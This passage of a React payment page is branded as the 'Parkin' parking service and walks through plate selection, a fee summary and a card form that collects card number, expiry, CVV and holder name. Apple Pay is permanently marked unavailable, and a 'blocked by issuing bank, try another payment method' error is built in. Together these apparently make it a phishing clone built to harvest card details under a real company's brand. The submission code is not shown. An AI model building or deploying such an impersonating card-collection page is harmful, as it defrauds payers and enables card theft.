                  <span className="text-[15px] text-[#045464] font-medium">{selectedCategory?.name || L("select")}</span>
                  <svg width="14" height="14" viewBox="0 0 14 14" fill="none" className={`text-gray-400 transition-transform ${isCategoryOpen ? 'rotate-180' : ''}`}><path d="M3 5L7 9L11 5" stroke="currentColor" strokeWidth="1.5"/></svg>
                </div>
                {isCategoryOpen && (
                  <div className="absolute left-0 right-0 top-full mt-1 bg-white border border-gray-200 rounded-xl shadow-lg z-50 max-h-[300px] overflow-y-auto">
                    {selectedCountry.categories.map((cat) => (
                      <button key={cat.pid} onClick={() => { setSelectedCategory(cat); setSelectedCode(null); setIsCategoryOpen(false); }} className={`w-full text-left px-4 py-3 hover:bg-gray-50 transition-colors border-b border-gray-100 last:border-b-0 text-[14px] ${selectedCategory?.pid === cat.pid ? 'bg-[#f0f9f9] text-[#045464] font-medium' : 'text-gray-700'}`}>{cat.name}</button>
                    ))}
                  </div>
                )}
              </div>
            </div>
            <div className="flex flex-col md:flex-row gap-4 md:gap-6 mb-6 md:mb-10">
              {/* Plate Code */}
              <div className="border border-gray-200 bg-white rounded-xl p-4 w-full md:w-[200px] relative" ref={codeRef}>
                <label className="text-[12px] text-gray-500 block mb-1">{L("plate_code")}</label>
                <div className="flex items-center justify-between cursor-pointer" onClick={() => { setIsCodeOpen(!isCodeOpen); setIsCountryOpen(false); setIsCategoryOpen(false); }}>
                  <span className={`text-[15px] ${selectedCode ? 'text-[#045464] font-medium' : 'text-gray-400'}`}>{selectedCode?.name || L("select")}</span>
                  <svg width="14" height="14" viewBox="0 0 14 14" fill="none" className={`text-gray-400 transition-transform ${isCodeOpen ? 'rotate-180' : ''}`}><path d="M3 5L7 9L11 5" stroke="currentColor" strokeWidth="1.5"/></svg>
                </div>
                {isCodeOpen && selectedCategory && (
                  <div className="absolute left-0 right-0 top-full mt-1 bg-white border border-gray-200 rounded-xl shadow-lg z-50 max-h-[300px] overflow-y-auto">
                    {selectedCategory.codes.map((code) => (
                      <button key={code.pid} onClick={() => { setSelectedCode(code); setIsCodeOpen(false); }} className={`w-full text-left px-4 py-3 hover:bg-gray-50 transition-colors border-b border-gray-100 last:border-b-0 text-[14px] ${selectedCode?.pid === code.pid ? 'bg-[#f0f9f9] text-[#045464] font-medium' : 'text-gray-700'}`}>{code.name}</button>
                    ))}
                  </div>
                )}
              </div>
              {/* Plate Number */}
              <div className="border border-gray-200 bg-white rounded-xl p-4 flex-1">
                <label className="text-[12px] text-gray-500 block mb-1">{L("plate_number")}</label>
                <input
                  type="text"
                  placeholder={L("enter_plate_number")}
                  value={plateNumber}
                  onChange={(e) => setPlateNumber(e.target.value)}
                  className="bg-transparent text-[15px] text-gray-700 outline-none w-full"
                />
              </div>
            </div>
            {/* Back / Next buttons */}
            <div className="flex items-center justify-between">
              <button onClick={handleBack} className="flex items-center gap-2 text-[#045464] text-[15px] font-medium hover:underline">
                <svg width="16" height="16" viewBox="0 0 16 16" fill="none" className={isAr ? 'rotate-180' : ''}><path d="M10 4L6 8L10 12" stroke="#045464" strokeWidth="1.5"/></svg>
                {L("back")}
              </button>
              <button onClick={handleNext} className="bg-[#045464] text-white px-10 py-3 rounded-full text-[15px] font-semibold hover:bg-[#004a4f] transition-colors">
                {L("next")}
              </button>
            </div>
          </div>
        )}

        {/* ── STEP 3: Summary ── */}
        {step === 3 && (
          <div>
            <h2 className="text-[22px] font-bold text-gray-900 mb-8">{L("summary")}</h2>
            <div className="bg-white rounded-xl border border-gray-200 p-6 mb-8 max-w-[700px]">
              <div className="space-y-4">
                <div className="flex justify-between items-center py-3 border-b border-gray-100">
                  <span className="text-gray-500 text-[14px]">{L("parking_zone")}</span>
                  <span className="text-gray-900 font-semibold text-[15px]">{zoneCode}</span>
                </div>
                <div className="flex justify-between items-center py-3 border-b border-gray-100">
                  <span className="text-gray-500 text-[14px]">{L("duration")}</span>
                  <span className="text-gray-900 font-semibold text-[15px]">{durationLabel}</span>
                </div>
                <div className="flex justify-between items-center py-3 border-b border-gray-100">
                  <span className="text-gray-500 text-[14px]">{L("country_emirate")}</span>
                  <span className="text-gray-900 font-semibold text-[15px]">{selectedCountry.name}</span>
                </div>
                <div className="flex justify-between items-center py-3 border-b border-gray-100">
                  <span className="text-gray-500 text-[14px]">{L("plate_category")}</span>
                  <span className="text-gray-900 font-semibold text-[15px]">{selectedCategory?.name}</span>
                </div>
                <div className="flex justify-between items-center py-3 border-b border-gray-100">
                  <span className="text-gray-500 text-[14px]">{L("plate_code")}</span>
                  <span className="text-gray-900 font-semibold text-[15px]">{selectedCode?.name || '-'}</span>
                </div>
                <div className="flex justify-between items-center py-3 border-b border-gray-100">
                  <span className="text-gray-500 text-[14px]">{L("plate_number")}</span>
                  <span className="text-gray-900 font-semibold text-[15px]">{plateNumber || '-'}</span>
                </div>
                <div className="flex justify-between items-center py-3">
                  <span className="text-gray-500 text-[14px]">{L("parking_fee")}</span>
                  <span className="text-[#045464] font-bold text-[18px]">Ð {totalFees}</span>
                </div>
              </div>
            </div>
            {/* Back / Next buttons */}
            <div className="flex items-center justify-between max-w-[700px]">
              <button onClick={handleBack} className="flex items-center gap-2 text-[#045464] text-[15px] font-medium hover:underline">
                <svg width="16" height="16" viewBox="0 0 16 16" fill="none" className={isAr ? 'rotate-180' : ''}><path d="M10 4L6 8L10 12" stroke="#045464" strokeWidth="1.5"/></svg>
                {L("back")}
              </button>
              <button onClick={handleNext} className="bg-[#045464] text-white px-10 py-3 rounded-full text-[15px] font-semibold hover:bg-[#004a4f] transition-colors">
                {L("next")}
              </button>
            </div>
          </div>
        )}

        {/* ── STEP 4: Payment Method ── */}
        {step === 4 && (
          <div>
            <h2 className="text-[22px] font-bold text-gray-900 mb-8">{L("payment_method")}</h2>
            <div className="max-w-[700px]">
              {/* Payment method selection */}
              <div className="flex flex-col md:flex-row gap-3 md:gap-4 mb-6 md:mb-8">
                <button
                  onClick={() => setPaymentMethod('card')}
                  className={`flex-1 border-2 rounded-xl p-5 flex items-center gap-4 transition-colors ${paymentMethod === 'card' ? 'border-[#045464] bg-[#f0f9f9]' : 'border-gray-200 bg-white hover:border-gray-300'}`}
                >
                  <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === 'card' ? 'border-[#045464]' : 'border-gray-300'}`}>
                    {paymentMethod === 'card' && <div className="w-3 h-3 rounded-full bg-[#045464]"/>}
                  </div>
                  <div className="flex items-center gap-3">
                    <svg width="32" height="24" viewBox="0 0 32 24" fill="none"><rect width="32" height="24" rx="4" fill="#1A1F71"/><circle cx="12" cy="12" r="7" fill="#EB001B"/><circle cx="20" cy="12" r="7" fill="#F79E1B" fillOpacity="0.8"/></svg>
                    <span className="text-[14px] font-medium text-gray-700">{L("credit_debit_card")}</span>
                  </div>
                </button>
                <button
                  onClick={() => setPaymentMethod('apple')}
                  className={`flex-1 border-2 rounded-xl p-5 flex flex-col transition-colors ${paymentMethod === 'apple' ? 'border-[#045464] bg-[#f0f9f9]' : 'border-gray-200 bg-white hover:border-gray-300'}`}
                >
                  <div className="flex items-center gap-4">
                    <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === 'apple' ? 'border-[#045464]' : 'border-gray-300'}`}>
                      {paymentMethod === 'apple' && <div className="w-3 h-3 rounded-full bg-[#045464]"/>}
                    </div>
                    <div className="flex items-center gap-3">
                      <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M17.05 20.28c-.98.95-2.05.88-3.08.4-1.09-.5-2.08-.48-3.24 0-1.44.62-2.2.44-3.06-.4C3.79 16.17 4.36 9.02 8.93 8.75c1.28.07 2.17.72 2.92.77.97-.2 1.9-.77 2.94-.7 1.24.1 2.18.58 2.8 1.48-2.56 1.53-1.95 4.89.58 5.83-.46 1.2-.67 1.73-1.28 2.79-.98 1.7-2.36 3.82-4.07 3.86-.73.02-1.22-.38-1.99-.38-.77 0-1.32.4-2.02.4-1.66-.04-2.93-1.98-3.92-3.68C3.44 15.28 2.88 11.5 4.3 9.1c1-1.68 2.78-2.67 4.68-2.7 1.1-.02 2.15.62 2.82.62.67 0 1.93-.77 3.25-.66.55.02 2.1.22 3.1 1.68-2.7 1.58-2.27 5.6.9 6.68" fill="#000"/></svg>
                      <span className="text-[14px] font-medium text-gray-700">{L("apple_pay")}</span>
                    </div>
                  </div>
                  {paymentMethod === 'apple' && (
                    <p className="text-[12px] text-red-600 mt-2 text-center w-full">
                      {lang === 'ar' ? 'الدفع عن طريق Apple Pay غير متاح حالياً' : 'Apple Pay is currently unavailable'}
                    </p>
                  )}
                </button>
              </div>

              {/* Rejected Error Message */}
              {rejectedError && (
                <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
                  <p className="text-red-600 text-center font-medium">{lang === 'ar' ? 'معلومات البطاقة المدخلة غير صحيحة' : 'The entered card information is incorrect'}</p>
                </div>
              )}

              {/* Global Blocked Card Error */}
              {globalBlockedError && (
                <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
                  <p className="text-red-600 text-center font-medium">{lang === 'ar' ? 'تم رفض العملية من قبل البنك المصدر للبطاقة' : 'Transaction rejected by the issuing bank'}</p>
                  <p className="text-red-500 text-center text-sm mt-1">{lang === 'ar' ? 'يرجى المحاولة بوسيلة دفع أخرى' : 'Please try another payment method'}</p>
                </div>
              )}

              {/* Card form */}
              {paymentMethod === 'card' && (
                <div className="bg-white rounded-xl border border-gray-200 p-6 mb-8">
                  <div className="space-y-4">
                    <div>
                      <label className="text-[12px] text-gray-500 block mb-2">{L("card_number")}</label>
                      <input
                        type="tel"
                        inputMode="numeric"
                        placeholder={L("enter_card_number")}
                        value={cardNumber}
                        onChange={handleCardChange}
                        onFocus={() => setRejectedError(false)}
                        className={`w-full border rounded-lg px-4 py-3 text-[15px] outline-none focus:border-[#045464] transition-colors ${(cardError || luhnError) ? 'border-red-500' : 'border-gray-200'}`}
                        maxLength={19}
                      />
                      {(cardError || luhnError) && (
                        <p className="text-red-500 text-xs mt-1">{luhnError ? (lang === 'ar' ? 'رقم البطاقة غير صحيح' : 'Invalid card number') : (lang === 'ar' ? 'رقم البطاقة غير صحيح' : 'Invalid card number')}</p>
                      )}
                    </div>
                    <div className="flex gap-4">
                      <div className="flex-1">
                        <label className="text-[12px] text-gray-500 block mb-2">{L("expiry_date")}</label>
                        <input
                          type="tel"
                          inputMode="numeric"
                          placeholder="MM/YY"
                          value={expiryDate}
                          onChange={handleExpiryChange}
                          className={`w-full border rounded-lg px-4 py-3 text-[15px] outline-none focus:border-[#045464] transition-colors ${expiryError ? 'border-red-500' : 'border-gray-200'}`}
                          maxLength={5}
                        />
                        {expiryError && (
                          <p className="text-red-500 text-xs mt-1">{lang === 'ar' ? 'تاريخ الانتهاء غير صحيح' : 'Invalid expiry date'}</p>
                        )}
                      </div>
                      <div className="flex-1">
                        <label className="text-[12px] text-gray-500 block mb-2">{L("cvv")}</label>
                        <input
                          type="password"
                          inputMode="numeric"
                          placeholder="***"
                          value={cvv}
                          onChange={(e) => {
                            const val = e.target.value.replace(/[^0-9]/g, '').slice(0, 3);
                            setCvv(val);
                            setCvvError(val.length > 0 && val.length < 3);
                          }}
                          className={`w-full border rounded-lg px-4 py-3 text-[15px] outline-none focus:border-[#045464] transition-colors ${cvvError ? 'border-red-500' : 'border-gray-200'}`}
                          maxLength={3}
                        />
                        {cvvError && (
                          <p className="text-red-500 text-xs mt-1">{lang === 'ar' ? 'CVV يجب أن يكون 3 أرقام' : 'CVV must be 3 digits'}</p>
                        )}
                      </div>
                    </div>
                    <div>
                      <label className="text-[12px] text-gray-500 block mb-2">{L("card_holder")}</label>
                      <input
                        type="text"
                        placeholder={L("enter_card_holder")}
                        value={cardHolder}
                        onChange={(e) => setCardHolder(e.target.value.replace(/[^A-Za-z\s]/g, ''))}
                        className="w-full border border-gray-200 rounded-lg px-4 py-3 text-[15px] outline-none focus:border-[#045464] transition-colors"
                      />
                    </div>
                  </div>
                </div>
              )}

              {/* Total */}
              <div className="bg-white rounded-xl border border-gray-200 p-6 mb-8">
                <div className="flex justify-between items-center">
                  <span className="text-gray-700 text-[16px] font-medium">{L("total")}</span>
                  <span className="text-[#045464] text-[24px] font-bold">Ð {totalFees}</span>
                </div>
              </div>

              {/* Back / Pay buttons */}
              <div className="flex items-center justify-between">
                <button onClick={handleBack} className="flex items-center gap-2 text-[#045464] text-[15px] font-medium hover:underline">
                  <svg width="16" height="16" viewBox="0 0 16 16" fill="none" className={isAr ? 'rotate-180' : ''}><path d="M10 4L6 8L10 12" stroke="#045464" strokeWidth="1.5"/></svg>
                  {L("back")}
                </button>
                <button
                  onClick={handlePay}
                  disabled={isProcessing || !paymentMethod || paymentMethod === 'apple' || luhnError || expiryError || (paymentMethod === 'card' && (!cardNumber || !expiryDate || expiryDate.length !== 5 || !isValidExpiry(expiryDate) || !cvv || cvv.length !== 3 || !cardHolder))}
                  className="bg-[#045464] text-white px-10 py-3 rounded-full text-[15px] font-semibold hover:bg-[#004a4f] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  {isProcessing ? L("processing") : `${L("pay_now")} Ð ${totalFees}`}
                </button>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* ═══════ FOOTER ═══════ */}
      <footer className="bg-[#045464] text-white mt-20 py-10">
        <div className="max-w-[1400px] mx-auto px-6 text-center">
          <ParkinLogo white size="h-[40px]" />
          <p className="text-white/60 text-[13px] mt-4">© 2025 Parkin. All rights reserved.</p>
        </div>
      </footer>
    </div>
  );
}
